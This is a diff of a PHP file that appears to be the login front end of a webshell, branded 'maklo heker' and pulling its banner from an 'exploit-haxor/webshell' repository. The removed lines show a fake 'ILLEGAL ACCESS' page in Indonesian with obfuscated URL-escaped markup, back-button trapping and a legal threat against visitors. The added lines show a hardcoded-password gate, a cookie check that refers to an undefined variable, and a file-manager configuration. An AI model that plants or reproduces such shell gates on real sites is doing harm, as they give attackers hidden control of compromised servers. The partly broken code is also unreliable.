@@ -1,105 +1,95 @@
+<?php
+session_start();
 
-<?php  	
-error_reporting(0);
-	session_start();
-	$correctPassword = "TBL "; //Change Password
-	if (isset($_POST['pass'])) {
-		$enteredPassword = $_POST['pass'];
-		if ($enteredPassword === $correctPassword) {
-			$_SESSION['forbidden'] = true;
-		} else {
-					echo '<script>
-				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://media1.tenor.com/m/J01NX0ikmNwAAAAC/ricardo-flick-dance.gif\'>";
-				var source = "https://cvar1984.github.io/audio/moan.mp3"
-				var audio = document.createElement("audio");
-				audio.autoplay = true;
-                                
-				audio.load()
-				audio.play();
-				audio.src = source;
-			</script>';
+define('PASSWORD', 'tbl'); 
 
-		}
-	}
-	if (isset($_GET['logout'])) {
-		session_unset();
-		session_destroy();
-		header("Location: ".$_SERVER['PHP_SELF']);
-		exit();
-	}
-	if (!isset($_SESSION['forbidden'])) {
-	?>
-	<!DOCTYPE html>
-	<html>
-	<head>
-
-
-	<title>ILLEGAL ACCESS!</title>
-
-
-        
-
-<script>
-function ClearError() {return true;}window.onerror = ClearError;
-	 (function () {
-	 for(var i = 0; i < 20; i++) {
-	 history.pushState(null, document.title, window.location.href );
-	 }
-	 })(document, window, history);
-</script>
-
-<script language="JavaScript">
-    window.onbeforeunload = confirmExit;
-    function confirmExit() {
-        return "You have attempted to leave this page. Are you sure?";
+// Proses login
+if (isset($_POST['password'])) {
+    if ($_POST['password'] === PASSWORD) {
+        $_SESSION['authenticated'] = true;
+        echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
+    } else {
+        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
     }
+}
 
-		
-	<body>
-<br>
+// Proses logout
+if (isset($_POST['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
 
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+    // Tampilkan form login jika belum terautentikasi
+    echo '
+    <style>
+        body {
+            background: linear-gradient(135deg, pink 50%, #ffcccb 50%);
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-card {
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background-color: white;
+        }
+        .login-card img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .login-card h1 {
+            margin-bottom: 20px;
+            animation: colorChange 3s infinite;
+        }
+        @keyframes colorChange {
+            0%, 100% {
+                color: pink;
+            }
+            50% {
+                color: lightblue;
+            }
+        }
+        .login-card .form-group {
+            margin-bottom: 15px;
+        }
+        .login-card .btn {
+            width: 100%;
+        }
+    </style>
+    <div class="login-card">
+        <h1>maklo heker</h1>
+        <img src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.png" alt="Banner Image" class="img-fluid">
+        <form method="post">
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Login</button>
+        </form>
+    </div>';
+    exit;
+}
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
+    // Memeriksa apakah password dikirim dan benar
+    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
+        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
+        // Logika setelah login berhasil
+    } else {
+        admin_login();
+    }
+}
 
-    <script>
-
-<!-- code by fbi.gov -->
-document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%20%50%55%42%4C%49%43%20%22%2D%2F%2F%57%33%43%2F%2F%44%54%44%20%58%48%54%4D%4C%20%31%2E%30%20%53%74%72%69%63%74%2F%2F%45%4E%22%20%22%68%74%74%70%3A%2F%2F%77%77%77%2E%77%33%2E%6F%72%67%2F%54%52%2F%78%68%74%6D%6C%31%2F%44%54%44%2F%78%68%74%6D%6C%31%2D%73%74%72%69%63%74%2E%64%74%64%22%3E%0A%3C%68%74%6D%6C%20%78%6D%6C%6E%73%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%77%33%2E%6F%72%67%2F%31%39%39%39%2F%78%68%74%6D%6C%22%3E%0A%3C%68%65%61%64%3E%0A%3C%6D%65%74%61%20%68%74%74%70%2D%65%71%75%69%76%3D%22%43%6F%6E%74%65%6E%74%2D%54%79%70%65%22%20%63%6F%6E%74%65%6E%74%3D%22%74%65%78%74%2F%68%74%6D%6C%3B%20%63%68%61%72%73%65%74%3D%69%73%6F%2D%38%38%35%39%2D%31%22%2F%3E%0A%3C%74%69%74%6C%65%3E%69%6C%6C%65%67%61%6C%20%61%63%63%65%73%73%21%21%21%3C%2F%74%69%74%6C%65%3E%0A%3C%73%63%72%69%70%74%3E%0A%66%75%6E%63%74%69%6F%6E%20%43%6C%65%61%72%45%72%72%6F%72%28%29%20%7B%72%65%74%75%72%6E%20%74%72%75%65%3B%7D%77%69%6E%64%6F%77%2E%6F%6E%65%72%72%6F%72%20%3D%20%43%6C%65%61%72%45%72%72%6F%72%3B%0A%09%20%28%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%09%20%66%6F%72%28%76%61%72%20%69%20%3D%20%30%3B%20%69%20%3C%20%32%30%3B%20%69%2B%2B%29%20%7B%0A%09%20%68%69%73%74%6F%72%79%2E%70%75%73%68%53%74%61%74%65%28%6E%75%6C%6C%2C%20%64%6F%63%75%6D%65%6E%74%2E%74%69%74%6C%65%2C%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%29%3B%0A%09%20%7D%0A%09%20%7D%29%28%64%6F%63%75%6D%65%6E%74%2C%20%77%69%6E%64%6F%77%2C%20%68%69%73%74%6F%72%79%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%74%79%6C%65%20%74%79%70%65%3D%22%74%65%78%74%2F%63%73%73%22%3E%0A%3C%21%2D%2D%0A%62%6F%64%79%7B%6D%61%72%67%69%6E%3A%30%3B%66%6F%6E%74%2D%73%69%7A%65%3A%2E%37%65%6D%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%56%65%72%64%61%6E%61%2C%20%41%72%69%61%6C%2C%20%48%65%6C%76%65%74%69%63%61%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%66%66%38%61%30%30%3B%7D%0A%66%69%65%6C%64%73%65%74%7B%70%61%64%64%69%6E%67%3A%30%20%31%35%70%78%20%31%30%70%78%20%31%35%70%78%3B%7D%20%0A%68%31%7B%66%6F%6E%74%2D%73%69%7A%65%3A%32%2E%34%65%6D%3B%6D%61%72%67%69%6E%3A%30%3B%63%6F%6C%6F%72%3A%23%66%66%38%61%30%30%3B%7D%0A%68%32%7B%66%6F%6E%74%2D%73%69%7A%65%3A%31%2E%37%65%6D%3B%6D%61%72%67%69%6E%3A%30%3B%63%6F%6C%6F%72%3A%23%43%43%30%30%30%30%3B%7D%20%0A%68%33%7B%66%6F%6E%74%2D%73%69%7A%65%3A%31%2E%32%65%6D%3B%6D%61%72%67%69%6E%3A%31%30%70%78%20%30%20%30%20%30%3B%63%6F%6C%6F%72%3A%23%30%30%30%30%30%30%3B%7D%20%0A%23%68%65%61%64%65%72%7B%77%69%64%74%68%3A%39%36%25%3B%6D%61%72%67%69%6E%3A%30%20%30%20%30%20%30%3B%70%61%64%64%69%6E%67%3A%36%70%78%20%32%25%20%36%70%78%20%32%25%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%22%74%72%65%62%75%63%68%65%74%20%4D%53%22%2C%20%56%65%72%64%61%6E%61%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%63%6F%6C%6F%72%3A%23%46%46%46%3B%0A%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%66%66%38%61%30%30%3B%7D%0A%23%63%6F%6E%74%65%6E%74%7B%6D%61%72%67%69%6E%3A%30%20%30%20%30%20%32%25%3B%70%6F%73%69%74%69%6F%6E%3A%72%65%6C%61%74%69%76%65%3B%7D%0A%2E%63%6F%6E%74%65%6E%74%2D%63%6F%6E%74%61%69%6E%65%72%7B%62%61%63%6B%67%72%6F%75%6E%64%3A%23%46%46%46%3B%77%69%64%74%68%3A%39%36%25%3B%6D%61%72%67%69%6E%2D%74%6F%70%3A%38%70%78%3B%70%61%64%64%69%6E%67%3A%31%30%70%78%3B%70%6F%73%69%74%69%6F%6E%3A%72%65%6C%61%74%69%76%65%3B%7D%0A%2D%2D%3E%0A%3C%2F%73%74%79%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%3C%68%33%3E%0A%3C%63%65%6E%74%65%72%3E%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%65%2E%74%6F%70%34%74%6F%70%2E%69%6F%2F%70%5F%32%39%30%36%6F%75%73%6F%67%31%2E%70%6E%67%22%3E%3C%2F%69%6D%67%3E%20%3C%68%33%3E%53%69%73%74%65%6D%20%53%75%64%61%68%20%4D%65%6E%63%61%74%61%74%20%41%6C%61%6D%61%74%20%49%50%20%4B%61%6D%75%20%64%61%6E%20%4B%61%6D%69%20%61%6B%61%6E%20%6D%65%6E%69%6E%64%61%6B%6C%61%6E%6A%75%74%69%20%54%69%6E%64%61%6B%61%6E%20%69%6C%6C%65%67%61%6C%20%79%61%6E%67%20%41%6E%64%61%20%6C%61%6B%75%6B%61%6E%2E%21%21%21%3C%2F%68%33%3E%3C%66%6F%6E%74%3E%22%4B%61%6D%69%20%6D%65%6E%64%65%74%65%6B%73%69%20%61%64%61%6E%79%61%20%74%69%6E%64%61%6B%20%6B%65%6A%61%68%61%74%61%6E%20%79%61%6E%67%20%41%6E%64%61%20%6C%61%6B%75%6B%61%6E%2C%20%54%69%6E%64%61%6B%61%6E%20%69%6E%69%20%74%65%6C%61%68%20%64%69%61%74%75%72%20%6F%6C%65%68%20%50%61%73%61%6C%20%33%30%20%61%79%61%74%20%31%2C%20%61%79%61%74%20%32%2C%20%64%61%6E%20%61%74%61%75%20%61%79%61%74%20%33%20%55%55%20%4E%6F%20%31%31%2F%32%30%30%38%20%74%65%6E%74%61%6E%67%20%49%6E%66%6F%72%6D%61%73%69%20%64%61%6E%20%54%72%61%6E%73%61%6B%73%69%20%45%6C%65%6B%74%72%6F%6E%69%6B%20%28%49%54%45%29%20%64%61%6E%20%50%61%73%61%6C%20%33%32%20%61%79%61%74%20%31%20%55%55%20%4E%6F%20%31%31%2F%32%30%30%38%20%74%65%6E%74%61%6E%67%20%49%6E%66%6F%72%6D%61%73%69%20%64%61%6E%20%54%72%61%6E%73%61%6B%73%69%20%45%6C%65%6B%74%72%6F%6E%69%6B%20%28%49%54%45%29%2E%22%3C%2F%66%6F%6E%74%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%62%6C%61%63%6B%3E%3C%62%72%3E%20%41%6C%61%6D%61%74%20%49%50%20%3A%20%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%72%65%64%3E%3C%2F%66%6F%6E%74%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%62%6C%61%63%6B%3E%20%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%72%65%64%3E'));
-</script>
-<br>
-
-<?php
-$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
-echo "  ". $ip;
-?>
-
-
-<br>
-<br>
-
-<center>
-
-	<form method="post">
-			<input placeholder="Tinggalkan pesan" type="password" name="pass" required>
-			<input type="submit" name="loginin" value="send!"></form>
-        
-
-<center>
-
-<br>
-
-<br>
-<form action="https://fbi.gov/wanted/" 
- <center><input type="submit" class="btn btn-primary" style="width: 950px;" value="INFORMASI LEBIH LANJUT 📩"></center>
-<br>
- 
-
-       
-
-		</form>
-	</body>
-	</html>
-
-
-<?php
+$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
+// Fungsi untuk menampilkan informasi sistem
 //Default Configuration
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
